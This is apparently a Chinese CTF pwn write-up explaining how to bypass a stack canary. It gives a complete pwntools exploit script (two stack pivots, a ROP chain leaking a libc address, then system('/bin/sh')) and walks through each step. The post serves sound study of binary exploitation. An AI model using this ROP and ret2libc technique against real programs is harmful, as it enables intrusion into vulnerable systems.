---
title: 有意思的canary
description: 学不懂!
pubDatetime: 2023-06-16
published: true
ogImage: ../../assets/4.png
language: cn
tags:
  - 网络安全
---
# 勘误 
> 感谢大专老哥，让我一直以来错误的思想完全纠错了过来。
> 不得不说，现在pwn的题目脑洞真的大。
> 连续三次遇到非常规的栈迁移和非常规的格式化字符串。
> 这里给出某战队师傅的锐评
> ![4DA953EC8C163A2B495F1FF649392822.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1686885711487-9d13f091-cc9b-4bc7-a59d-af784ae95253.jpeg#averageHue=%23fdfefe&clientId=uc38eb869-7fe5-4&from=paste&height=219&id=u4a71c358&originHeight=362&originWidth=879&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=61284&status=done&style=none&taskId=u05807259-1efb-4a57-9047-3474d62422f&title=&width=532.7272419364674)

水完这篇就不写了，上线代课的时候，忽然想到自己这里理解错了，虽然也写出来了，之前公众号一篇文章里面的一道题。<br />[声东击西|三道有意思的pwn题](https://mp.weixin.qq.com/s?__biz=Mzg3OTgzNjk4OA==&mid=2247486156&idx=1&sn=7b110b88a9e4645a7884a9461ec0925a&chksm=cf7f209ff808a98958b0c0ccb5b8c85d52de394317037209237c26023ca6247cc3e94101fabf#rd)<br />速度速度，搞完四级。<br />哦对，以后打比赛，写题目，最快的方法就是调试，调到栈上的返回地址啊什么的，为我们想要的，这样就能快速避免出错了！！！也不用去思考究竟便宜多少。一步步rop嘛。分解动作去调试完成。
## 题目

- 本题的重点在于如何绕过canary

![](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686652249303-57682fe4-653a-43c0-8097-c1369adb969d.png#averageHue=%23040403&from=url&id=vJCJr&originHeight=861&originWidth=1553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686652176225-fa5d57de-07da-44ee-b21c-b673c9c9d83a.png#averageHue=%23030202&from=url&id=wQMjg&originHeight=434&originWidth=1237&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
## EXP
废话不多说，先看exp<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1686885339882-d9693cf1-927f-4e2a-9b6d-bf2cf999065f.jpeg)
```python

from pwn import *
context.log_level = 'debug'

#io = gdb.debug('./canary')
p = process('./canary')
elf = ELF('./canary')
libc = elf.libc

r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)


main = 0x401296
main2 = 0x40133f
gift = 0x401258
pop_rdi = 0x4013e3
ret = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

sla(b"functions?\n", b'0')
s(p64(0x404900) + p64(main))
sla(b"functions?\n", b'0')
s(p64(0x404948) + p64(gift))

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift) + b'a' * 0x28  #+ p64(0x404900)
pause()
s(payload)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc_base', libc.address)
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
payload = b'a' * 0x18 + p64(pop_rdi) + p64(binsh) + p64(system)
pause()
s(payload)


shell()
```
## 重点：理解ret和call和参数寻址和

- call指令，将当前的地址push进去，也就是说，esp会下移动一个位
- ret指令，将pop当前esp指向的内容到eip，就就是说，esp会上移动一个位
- 参数寻址：不管esp如何，通过ebp定位，也就是说esp负责流程控制，ebp负责数据的定位

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686885420233-5525bfd2-ffe3-4386-9807-f5efac90513a.png#averageHue=%236e6c6a&clientId=uc38eb869-7fe5-4&from=paste&height=188&id=u5a458010&originHeight=310&originWidth=843&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30215&status=done&style=none&taskId=uadc52cbb-3a29-4e7d-b455-11135c1c6a1&title=&width=510.90906137934246)
## 本题的详细分析

- 通过主main函数的read来覆盖ebp，两次实现栈迁移（注意第一次迁移之后，read写入的位置）
- 通过gift里面call read来写栈的同时，也通过覆盖push进去的eip来绕过canary
### 第一次迁移rbp
```python
sla(b"functions?\n", b'0')
s(p64(0x404900) + p64(main))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686883993243-eebc35dc-10f0-4f8a-8a7c-e92a28b9a4b6.png#averageHue=%23141b1b&clientId=uc38eb869-7fe5-4&from=paste&height=707&id=Yib8l&originHeight=1166&originWidth=1380&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1417060&status=done&style=none&taskId=u34505aa8-ba76-4ac1-863c-914cab17e41&title=&width=836.3635880231228)<br />![Snipaste_2023-06-16_10-22-42.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686883958742-ab317bbd-87a3-4e1d-b822-f028f17f2054.png#averageHue=%23181f1f&clientId=uc38eb869-7fe5-4&from=paste&height=530&id=u214bde6c&originHeight=875&originWidth=1271&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=646418&status=done&style=none&taskId=u3eabdd65-4b9c-495c-8238-806db1e9211&title=&width=770.3029857807168)
### 第二次迁移rsp，于写目标栈
```python
sla(b"functions?\n", b'0')
s(p64(0x404948) + p64(gift))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884033596-d7aca4b0-6725-4849-93dc-128893f77a26.png#averageHue=%23151e21&clientId=uc38eb869-7fe5-4&from=paste&height=398&id=ub4090f35&originHeight=656&originWidth=1166&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=892316&status=done&style=none&taskId=u2ff15ac4-1e1c-45bf-9dc4-e6a4d1f5a43&title=&width=706.6666258224357)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884106541-dad337dc-4e7b-4835-89dd-a002ad17ef34.png#averageHue=%231a2120&clientId=uc38eb869-7fe5-4&from=paste&height=239&id=u50d58987&originHeight=394&originWidth=1280&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=668459&status=done&style=none&taskId=uce52fa95-2abe-48f2-99f3-80c18adfd14&title=&width=775.757530919998)
### 目标栈写rop链同时，覆盖call返回绕过canary
```python
payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift) + b'a' * 0x28 + p64(0x404900)
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884151274-bcc2e2ac-f89a-40e1-9dc4-b34c46107d83.png#averageHue=%23141c1a&clientId=uc38eb869-7fe5-4&from=paste&height=467&id=u4a1d2aad&originHeight=771&originWidth=1203&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1009380&status=done&style=none&taskId=u18872cfc-589d-4972-9894-828e68709a2&title=&width=729.0908669505918)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884158945-b11da903-6fc8-4cb1-891f-ea819eaac217.png#averageHue=%23172023&clientId=uc38eb869-7fe5-4&from=paste&height=311&id=uef8d7f2e&originHeight=513&originWidth=1362&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=648016&status=done&style=none&taskId=u7cf33ae5-1ef2-4cd2-870e-56d43af3f4e&title=&width=825.4544977445604)
### 成功指向并泄露libc
```python
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc_base', libc.address)
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884185201-3fd3742a-b7df-449f-bb25-b246274f9c54.png#averageHue=%2313191b&clientId=uc38eb869-7fe5-4&from=paste&height=776&id=u4acb32e9&originHeight=1280&originWidth=2487&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=3075709&status=done&style=none&taskId=u8887355c-ba1f-4950-a0e2-ef304a47742&title=&width=1507.272640154715)
### 再次覆盖gift里面的call，从而再次绕过canary直接getshell
```python
payload = b'a' * 0x18 + p64(pop_rdi) + p64(binsh) + p64(system)
pause()
s(payload)
shell()
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884236766-1575fc6d-3f44-4ed1-9844-e2b7e7e1a7a0.png#averageHue=%231b2527&clientId=uc38eb869-7fe5-4&from=paste&height=674&id=uaf573afb&originHeight=1112&originWidth=1297&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1548612&status=done&style=none&taskId=u0d8037a8-6ce0-427a-a22a-d529e832820&title=&width=786.0605606275292)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1686884249806-19481e75-6685-4ffd-9be3-563ca5a26a1c.png#averageHue=%230a0e10&clientId=uc38eb869-7fe5-4&from=paste&height=425&id=uf8b2c928&originHeight=701&originWidth=1120&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=640099&status=done&style=none&taskId=u84b27d76-8bf0-4202-81f8-e909b6d1d81&title=&width=678.7878395549983)
## 图解流程
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1686885386260-da81dac6-df71-46b6-a832-4bb12c9442e9.jpeg)
